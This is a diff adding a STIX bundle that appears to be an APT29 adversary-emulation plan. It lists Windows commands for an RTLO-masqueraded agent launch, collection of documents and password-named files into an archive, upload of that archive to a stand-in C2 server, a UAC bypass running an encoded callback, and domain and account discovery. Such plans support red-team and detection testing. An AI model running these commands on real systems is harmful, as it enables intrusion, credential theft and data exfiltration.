@@ -1,0 +1,3624 @@
+{
+    "type": "bundle",
+    "id": "bundle--ec02411f-b46d-452c-a505-3d55dfbdd6cd",
+    "objects": [
+        {
+            "type": "campaign",
+            "spec_version": "2.1",
+            "id": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "created": "2024-02-03T15:12:49.115118Z",
+            "modified": "2024-02-03T15:12:49.115118Z",
+            "name": "APT29",
+            "description": "APT29 is a threat group that has been attributed to the Russian government who have been in operation since at least 2008. This group reportedly compromised the Democratic National Committee starting in the summer of 2015."
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--571845f6-b75c-4b9d-a666-a78f7827261f",
+            "created": "2024-02-03T15:12:49.115587Z",
+            "modified": "2024-02-03T15:12:49.115587Z",
+            "name": "RTLO Start Sandcat",
+            "description": "Perform RTLO technique with SANDCAT",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1036.002",
+                    "input_arguments": {
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Sleep 3;\n$bin = Get-ChildItem *cod*scr*;\n$arguments = '-server \"#{server}\" -group \"rtlo_group\"';\nstart-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;\n\nif ($?) {\n  write-host \"Successfully completed RTLO execution. A new agent should appear\";\n  exit 0;\n\n} else {\n  write-host \"Failure of RTLO execution.\";\n  exit 1;\n}\n",
+                                "payloads": [
+                                    "cod.3aka3.scr"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Masquerading: Right-to-Left Override"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cde9c652-d606-4e99-b252-5f658bbe1026",
+            "created": "2024-02-03T15:12:49.117352Z",
+            "modified": "2024-02-03T15:12:49.117352Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--571845f6-b75c-4b9d-a666-a78f7827261f",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b42ff6dd-22b0-4476-bb73-06b5c0dce936",
+            "created": "2024-02-03T15:12:49.117818Z",
+            "modified": "2024-02-03T15:12:49.117818Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--571845f6-b75c-4b9d-a666-a78f7827261f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a5daa530-c640-49bc-aa54-6808789a684a",
+            "created": "2024-02-03T15:12:49.118174Z",
+            "modified": "2024-02-03T15:12:49.118174Z",
+            "name": "PowerShell",
+            "description": "Spawn powershell.exe from cmd.exe",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1059.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "powershell.exe;\nif ($?) {\n  write-host \"[*] PowerShell successfully spawned\";\n  exit 0;\n}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Command and Scripting Interpreter: PowerShell"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c3d59dc8-9d94-40d0-be97-ca63e1b60ba9",
+            "created": "2024-02-03T15:12:49.118529Z",
+            "modified": "2024-02-03T15:12:49.118529Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--a5daa530-c640-49bc-aa54-6808789a684a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5692da31-3586-4e4f-8f07-5750070c730b",
+            "created": "2024-02-03T15:12:49.119608Z",
+            "modified": "2024-02-03T15:12:49.119608Z",
+            "name": "Automated Collection",
+            "description": "Execute PowerShell from cmd.exe to collect and compress files of specific extensions.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1119",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Automated Collection"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4110c932-a1af-4a23-afff-8ad4c6c64940",
+            "created": "2024-02-03T15:12:49.120069Z",
+            "modified": "2024-02-03T15:12:49.120069Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--5692da31-3586-4e4f-8f07-5750070c730b"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ee08a427-1e1d-4d8a-aeb1-978a7fcf9087",
+            "created": "2024-02-03T15:12:49.120657Z",
+            "modified": "2024-02-03T15:12:49.120657Z",
+            "name": "System Network Configuration Discovery",
+            "description": "The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1016",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "ipconfig /all\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d77f8e0e-0b14-4f70-8772-312bf63f4a2f",
+            "created": "2024-02-03T15:12:49.121008Z",
+            "modified": "2024-02-03T15:12:49.121008Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--ee08a427-1e1d-4d8a-aeb1-978a7fcf9087"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce",
+            "created": "2024-02-03T15:12:49.121347Z",
+            "modified": "2024-02-03T15:12:49.121347Z",
+            "name": "System Network Configuration Discovery",
+            "description": "The arp utility is executed via cmd to enumerate local ARP configuration information.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1016",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "arp -a\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Network Configuration Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--89f0634d-b0a2-4859-a14a-864e94e48e85",
+            "created": "2024-02-03T15:12:49.121659Z",
+            "modified": "2024-02-03T15:12:49.121659Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--35d95b64-c1f8-4ac7-a2f2-8959218239cd",
+            "created": "2024-02-03T15:12:49.121983Z",
+            "modified": "2024-02-03T15:12:49.121983Z",
+            "name": "System Owner / User Discovery",
+            "description": "The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1033",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "echo %USERDOMAIN%\\%USERNAME%\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Owner/User Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9bdb8398-972d-4859-b86e-28a8a9c665f1",
+            "created": "2024-02-03T15:12:49.122437Z",
+            "modified": "2024-02-03T15:12:49.122437Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--35d95b64-c1f8-4ac7-a2f2-8959218239cd"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--68e209dd-f354-4adc-8bc6-e85a3e55a7f4",
+            "created": "2024-02-03T15:12:49.122908Z",
+            "modified": "2024-02-03T15:12:49.122908Z",
+            "name": "Data from staged fileand Exfiltration over C2 Channel",
+            "description": "Copy a target file from a remote file share through the existing C2 channel",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1041",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\upload.ps1 -Verbose -Force;\nInvoke-MultipartFormDataUpload -InFile \"C:\\Users\\#{profile_user}\\AppData\\Roaming\\Draft.zip\" -Uri \"#{server}/file/upload\";\n",
+                                "payloads": [
+                                    "upload.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Exfiltration Over Command and Control Channel"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4b5ef960-d606-4f92-bc97-85cd126eac21",
+            "created": "2024-02-03T15:12:49.124039Z",
+            "modified": "2024-02-03T15:12:49.124039Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--68e209dd-f354-4adc-8bc6-e85a3e55a7f4",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--06679f66-cea0-4565-bf04-13ccc7e31a44",
+            "created": "2024-02-03T15:12:49.125148Z",
+            "modified": "2024-02-03T15:12:49.125148Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--68e209dd-f354-4adc-8bc6-e85a3e55a7f4",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a9c355e2-2df2-4fe2-a9d8-4b5357c61d05",
+            "created": "2024-02-03T15:12:49.125506Z",
+            "modified": "2024-02-03T15:12:49.125506Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--68e209dd-f354-4adc-8bc6-e85a3e55a7f4"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5df12481-9d8c-4235-b550-9cefc8ed7361",
+            "created": "2024-02-03T15:12:49.125849Z",
+            "modified": "2024-02-03T15:12:49.125849Z",
+            "name": "Process Discovery",
+            "description": "API call(s) are executed to enumerate local running processes.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\ps.ps1 -Verbose -Force;\nProcessList\n",
+                                "payloads": [
+                                    "ps.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f7152cab-336e-4c6d-bd5c-f2bf33fdbf7c",
+            "created": "2024-02-03T15:12:49.126182Z",
+            "modified": "2024-02-03T15:12:49.126182Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--5df12481-9d8c-4235-b550-9cefc8ed7361"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--41610306-087c-4c34-874b-37b8ed633a36",
+            "created": "2024-02-03T15:12:49.126498Z",
+            "modified": "2024-02-03T15:12:49.126498Z",
+            "name": "Process Discovery",
+            "description": "The tasklist utility is executed via cmd to enumerate local running processes.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "tasklist /v\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--810f8bfe-4f02-4e08-8bf6-848b9c7d2a49",
+            "created": "2024-02-03T15:12:49.126814Z",
+            "modified": "2024-02-03T15:12:49.126814Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--41610306-087c-4c34-874b-37b8ed633a36"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--2ff877b4-0c00-401e-9d3f-070c70b610df",
+            "created": "2024-02-03T15:12:49.127156Z",
+            "modified": "2024-02-03T15:12:49.127156Z",
+            "name": "System Service Discovery",
+            "description": "The sc utility is executed via cmd to enumerate local active services.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1007",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "sc query\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Service Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--fd0b209e-1f70-45ef-aa2d-f0f2fa39db38",
+            "created": "2024-02-03T15:12:49.12746Z",
+            "modified": "2024-02-03T15:12:49.12746Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--2ff877b4-0c00-401e-9d3f-070c70b610df"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--144b1384-5060-494f-80eb-91772695cdf3",
+            "created": "2024-02-03T15:12:49.127796Z",
+            "modified": "2024-02-03T15:12:49.127796Z",
+            "name": "System Service Discovery",
+            "description": "The net utility is executed via cmd to enumerate local active services.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1007",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net start\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Service Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f664d400-9889-4126-bb71-d05f272d95fc",
+            "created": "2024-02-03T15:12:49.128101Z",
+            "modified": "2024-02-03T15:12:49.128101Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--144b1384-5060-494f-80eb-91772695cdf3"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--d2ea2676-7f85-4228-b980-ab3c0e1adc03",
+            "created": "2024-02-03T15:12:49.128425Z",
+            "modified": "2024-02-03T15:12:49.128425Z",
+            "name": "System Information Discovery",
+            "description": "The systeminfo utility is executed via cmd to enumerate local operating system configuration.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "systeminfo\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ffd5f096-f592-4d12-a362-ad4ad3f73af6",
+            "created": "2024-02-03T15:12:49.128723Z",
+            "modified": "2024-02-03T15:12:49.128723Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--d2ea2676-7f85-4228-b980-ab3c0e1adc03"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--7c2a6e5b-1adb-464f-a581-4677391f8dd6",
+            "created": "2024-02-03T15:12:49.12905Z",
+            "modified": "2024-02-03T15:12:49.12905Z",
+            "name": "System Information Discovery",
+            "description": "The net utility is executed via cmd to enumerate local operating system configuration.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net config workstation\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2e5ccd4a-df0f-4561-901d-c2599e1f842c",
+            "created": "2024-02-03T15:12:49.130128Z",
+            "modified": "2024-02-03T15:12:49.130128Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--7c2a6e5b-1adb-464f-a581-4677391f8dd6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--faa96e7f-081a-40b7-a743-a6a7f2627ea3",
+            "created": "2024-02-03T15:12:49.130654Z",
+            "modified": "2024-02-03T15:12:49.130654Z",
+            "name": "Permissions Groups Discovery",
+            "description": "The net utility is executed via cmd to enumerate members of the local system's administrators group.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1069",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net localgroup administrators\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--dec81f9c-ad7f-49d7-aa95-b7d283d135b3",
+            "created": "2024-02-03T15:12:49.13108Z",
+            "modified": "2024-02-03T15:12:49.13108Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--faa96e7f-081a-40b7-a743-a6a7f2627ea3"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--26181249-be75-41ed-9fe7-5c30ea8c2d4d",
+            "created": "2024-02-03T15:12:49.131361Z",
+            "modified": "2024-02-03T15:12:49.131361Z",
+            "name": "Permissions Groups Discovery",
+            "description": "The net utility is executed via cmd to enumerate members of the domain controller\u2019s administrators group.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1069",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net localgroup administrators /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1496ffaf-262e-41d8-9bcf-ee1224be2494",
+            "created": "2024-02-03T15:12:49.131575Z",
+            "modified": "2024-02-03T15:12:49.131575Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--26181249-be75-41ed-9fe7-5c30ea8c2d4d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--84377d7a-0363-44fd-a082-44657ca1858f",
+            "created": "2024-02-03T15:12:49.131773Z",
+            "modified": "2024-02-03T15:12:49.131773Z",
+            "name": "Permissions Groups Discovery",
+            "description": "The net utility is executed via cmd to enumerate members of the domain administrators group.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1069",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "cmd.exe /c net group \"Domain Admins\" /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Permission Groups Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0e3d6780-0579-492c-8bef-2646b20e1a5a",
+            "created": "2024-02-03T15:12:49.131986Z",
+            "modified": "2024-02-03T15:12:49.131986Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--84377d7a-0363-44fd-a082-44657ca1858f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--61221fb9-cb32-46d5-98fd-90567a621526",
+            "created": "2024-02-03T15:12:49.132182Z",
+            "modified": "2024-02-03T15:12:49.132182Z",
+            "name": "Account Discovery",
+            "description": "The net utility is executed via cmd to enumerate domain user accounts.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1087",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net user /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Account Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9d78dc54-e095-4ac1-9c78-64a84eadb004",
+            "created": "2024-02-03T15:12:49.132352Z",
+            "modified": "2024-02-03T15:12:49.132352Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--61221fb9-cb32-46d5-98fd-90567a621526"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76",
+            "created": "2024-02-03T15:12:49.132562Z",
+            "modified": "2024-02-03T15:12:49.132562Z",
+            "name": "Account Discovery",
+            "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1087",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "net user %USERNAME% /domain\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Account Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3ad4d367-17a2-40a7-922f-2f4422cb163a",
+            "created": "2024-02-03T15:12:49.132748Z",
+            "modified": "2024-02-03T15:12:49.132748Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5c23f638-9cfc-4fc4-9cab-4af628fef70a",
+            "created": "2024-02-03T15:12:49.132973Z",
+            "modified": "2024-02-03T15:12:49.132973Z",
+            "name": "Query Registry",
+            "description": "The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1012",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Query Registry"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--32523f2a-aa0d-47d7-8202-eb37a8051642",
+            "created": "2024-02-03T15:12:49.133164Z",
+            "modified": "2024-02-03T15:12:49.133164Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--5c23f638-9cfc-4fc4-9cab-4af628fef70a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--68b588bc-002a-42dc-bac7-9189f944065b",
+            "created": "2024-02-03T15:12:49.133345Z",
+            "modified": "2024-02-03T15:12:49.133345Z",
+            "name": "Staging monkey PNG",
+            "description": "Staging PNG for Lateral Movement",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1036.005",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "$username=\"#{profile_user}\";\nif ( $(test-path -path \"C:\\Users\\$username\\Downloads\\monkey.png\") -eq $false ) {\n  copy-item monkey.png -Destination \"C:\\Users\\$username\\Downloads\\\\\" -Force;\n  if ($? -eq $True) {\n    write-host \"[+] Successfully copied monkey.png!\";\n    get-childitem -path \"C:\\Users\\$username\\Downloads\\\\\";\n    exit 0;\n  } else {\n    write-host \"[+] Failed to copy monkey.png.\";\n    exit 1;\n  }\n\n  } else {\n    write-host \"[*] monkey.png already exists within C:\\users\\$username\\Downloads...\"\n  }\n",
+                                "payloads": [
+                                    "monkey.png"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Masquerading: Match Legitimate Name or Location"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f28d4f79-f324-44ed-975e-7de92a3f6e2f",
+            "created": "2024-02-03T15:12:49.133826Z",
+            "modified": "2024-02-03T15:12:49.133826Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--68b588bc-002a-42dc-bac7-9189f944065b",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9d48b98f-17e5-48cb-b722-1e0ea84ce2e7",
+            "created": "2024-02-03T15:12:49.13405Z",
+            "modified": "2024-02-03T15:12:49.13405Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--68b588bc-002a-42dc-bac7-9189f944065b"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+            "created": "2024-02-03T15:12:49.134281Z",
+            "modified": "2024-02-03T15:12:49.134281Z",
+            "name": "Bypass User Account Control",
+            "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1134.001",
+                    "input_arguments": {
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;\nMove-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;\n$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Import-Module $env:APPDATA\\update.ps1;update('#{server}')\"));\nInvoke-BypassUACTokenManipulation -Arguments \"-nop -exec bypass -EncodedCommand $pcode\" -Verbose\n",
+                                "payloads": [
+                                    "update.ps1",
+                                    "Invoke-BypassUACTokenManipulation.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Access Token Manipulation: Token Impersonation/Theft"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e54fc01b-7614-4ff4-9083-f63c83a8a4fd",
+            "created": "2024-02-03T15:12:49.134786Z",
+            "modified": "2024-02-03T15:12:49.134786Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
